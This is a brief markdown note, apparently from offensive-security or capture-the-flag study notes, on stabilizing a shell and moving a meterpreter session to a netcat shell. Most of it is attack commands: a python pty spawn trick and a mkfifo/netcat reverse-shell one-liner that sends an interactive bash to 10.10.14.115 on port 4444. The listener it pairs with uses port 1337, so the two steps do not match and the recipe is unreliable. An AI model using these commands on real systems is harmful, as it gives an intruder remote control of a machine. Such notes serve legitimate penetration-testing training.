For the [Shell Stabilization](Shell%20Stabilization.md) first we need to execute `export TERM=xterm` then `python3 -c 'import pty;pty.spawn("/bin/bash")'` then ctrl+z and `stty raw -echo;fg` and reset + enter .

## Transfer shell from meterpreter 

First type `shell` then enter, now:

- On the unstable shell `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.115 4444 >/tmp/f`
- On attacking system `nc -lvnp 1337`

then Stabilize.